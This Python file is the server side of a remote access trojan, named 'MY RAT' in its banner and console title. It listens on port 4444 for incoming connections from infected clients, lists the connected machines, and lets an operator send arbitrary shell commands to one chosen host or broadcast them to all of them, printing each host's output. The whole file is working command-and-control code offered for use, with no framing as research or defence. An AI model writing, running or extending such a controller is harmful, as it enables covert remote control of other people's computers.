import socket
import threading
import os
from colorama import Fore
import ctypes

clients = {}

def logo():
    print(Fore.GREEN + r"""
MMMMMMMM               MMMMMMMMYYYYYYY       YYYYYYY     RRRRRRRRRRRRRRRRR                  AAA         TTTTTTTTTTTTTTTTTTTTTTT
M:::::::M             M:::::::MY:::::Y       Y:::::Y     R::::::::::::::::R                A:::A        T:::::::::::::::::::::T
M::::::::M           M::::::::MY:::::Y       Y:::::Y     R::::::RRRRRR:::::R              A:::::A       T:::::::::::::::::::::T
M:::::::::M         M:::::::::MY::::::Y     Y::::::Y     RR:::::R     R:::::R            A:::::::A      T:::::TT:::::::TT:::::T
M::::::::::M       M::::::::::MYYY:::::Y   Y:::::YYY       R::::R     R:::::R           A:::::::::A     TTTTTT  T:::::T  TTTTTT
M:::::::::::M     M:::::::::::M   Y:::::Y Y:::::Y          R::::R     R:::::R          A:::::A:::::A            T:::::T        
M:::::::M::::M   M::::M:::::::M    Y:::::Y:::::Y           R::::RRRRRR:::::R          A:::::A A:::::A           T:::::T        
M::::::M M::::M M::::M M::::::M     Y:::::::::Y            R:::::::::::::RR          A:::::A   A:::::A          T:::::T        
M::::::M  M::::M::::M  M::::::M      Y:::::::Y             R::::RRRRRR:::::R        A:::::A     A:::::A         T:::::T        
M::::::M   M:::::::M   M::::::M       Y:::::Y              R::::R     R:::::R      A:::::AAAAAAAAA:::::A        T:::::T        
M::::::M    M:::::M    M::::::M       Y:::::Y              R::::R     R:::::R     A:::::::::::::::::::::A       T:::::T        
M::::::M     MMMMM     M::::::M       Y:::::Y              R::::R     R:::::R    A:::::AAAAAAAAAAAAA:::::A      T:::::T        
M::::::M               M::::::M       Y:::::Y            RR:::::R     R:::::R   A:::::A             A:::::A   TT:::::::TT      
M::::::M               M::::::M    YYYY:::::YYYY         R::::::R     R:::::R  A:::::A               A:::::A  T:::::::::T      
M::::::M               M::::::M    Y:::::::::::Y         R::::::R     R:::::R A:::::A                 A:::::A T:::::::::T      
MMMMMMMM               MMMMMMMM    YYYYYYYYYYYYY         RRRRRRRR     RRRRRRRAAAAAAA                   AAAAAAATTTTTTTTTTT 
    """ + Fore.RESET)

def handle_client(client_socket, addr):
    clients[addr] = client_socket
    if os.name == "nt":
        ctypes.windll.kernel32.SetConsoleTitleW(f"MY RAT | CONNECTED CLIENTS: {len(clients)}")

    while True:
        try:
            response = client_socket.recv(4096).decode()
            if not response:
                break
            print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
        except (ConnectionResetError, BrokenPipeError):
            break

    print(f"\n{Fore.RESET}{Fore.RED}[-]{Fore.RESET} Client {addr[0]} disconnected")
    client_socket.close()
    del clients[addr]

def accept_clients(server):
    while True:
        client_socket, addr = server.accept()
        print(f"\n{Fore.GREEN}[+]{Fore.RESET} New connection from {addr[0]}:{addr[1]}")
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

def start_server(host="0.0.0.0", port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)

    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
    os.system("cls" if os.name == "nt" else "clear")
    logo()
    print(f"[{Fore.GREEN}*{Fore.RESET}] Listening on {host}:{port}")
    print(f"[{Fore.YELLOW}?{Fore.RESET}] Waiting for clients to connect...")

    while True:
        if not clients:
            continue

        print("\n[Connected Clients]")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"{idx}. {addr[0]}:{addr[1]}")

        try:
            choice = int(input("Select client number (or 0 to broadcast): ")) - 1
        except ValueError:
            print(f"[{Fore.RED}!{Fore.RESET}] Invalid input. Please enter a number.")
            continue

        if choice == -1:
            command = input("Enter command to send (broadcast): ")
            for client in clients.values():
                client.send(command.encode())
        elif 0 <= choice < len(clients):
            target_addr = list(clients.keys())[choice]
            command = input(f"Enter command to send to {target_addr[0]}: ")
            clients[target_addr].send(command.encode())
        else:
            print(f"[{Fore.RED}!{Fore.RESET}] Invalid selection")

if __name__ == "__main__":
    start_server()